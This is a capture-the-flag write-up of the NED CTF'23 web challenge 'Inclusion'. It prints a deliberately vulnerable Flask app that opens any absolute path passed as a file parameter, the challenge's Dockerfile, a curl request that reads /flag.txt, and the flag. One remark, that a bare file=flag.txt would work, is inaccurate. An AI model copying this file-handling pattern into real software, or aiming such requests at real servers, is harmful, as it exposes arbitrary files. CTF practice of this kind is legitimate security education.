---
title: NED CTF'23 - Web - Inclusion
date: '2023-07-03'
tags: ['ctf', 'web', 'nedctf', 'writeup', 'file-inclusion', 'flask']
draft: false
summary: Inclusion was a very simple file inclusion challenge in which we had to include /flag.txt to read the flag.
---

## Challenge Description

"A path to explore, a journey to embark. The challenge is hidden, but not in the dark. Traverse the way, and find your mark. The flag is waiting, for you to hark."

Author: [Saad Akhtar](https://twitter.com/ssaadakhtarr)

[Challenge-Link](http://159.223.192.150:5001/)

![chal-info](/static/writeups/nedctf/web/inclusion0.png)

## Solution

The challenge description is a hint to the challenge. The challenge is a simple file inclusion challenge. Downloading the files, we see the following files are given to us:

![files](/static/writeups/nedctf/web/inclusion1.png)

Now, let's checkout `app.py`

```python:app.py
import os
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    file_name = request.args.get("file")
    if file_name is None:
        return "No file name specified."
    if ".." in file_name:
        return "Invalid file name."
    file_path = os.path.join("/dev/null", file_name)
    try:
        with open(file_path, "r") as f:
            contents = f.read()
            return contents
    except:
        return "The file does not exist or cannot be opened."

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5001)
```

Well, we can see that, we need to provide an argument `file` to the server, which will be used to open a file. Now, the `/dev/null` is being used with `os.path.join`, however, it doesn't have any effect on the file path. So, we can simply use a parameter like `file=flag.txt` to get the flag. However, the `..` is being filtered, so we can't use `file=../flag.txt`. So, let's look at the `Dockerfile` and see where the flag is being stored

```Dockerfile:Dockerfile
FROM python:3.9-alpine

WORKDIR /app
COPY app.py /app/
COPY flag.txt /

RUN pip install flask

EXPOSE 5001
CMD ["python3", "app.py"]
```

Well, the flag is being copied to `/`, so, if we pass the following parameter `?file=/flag.txt`, we can get the flag, let's get the flag:

```bash
$ curl http://159.223.192.150:5001?file=/flag.txt
```

![flag](/static/writeups/nedctf/web/inclusion2.png)

```md
Flag: NCC{l0c4l_f1l3_1nclu5i0n_ex!sts}
```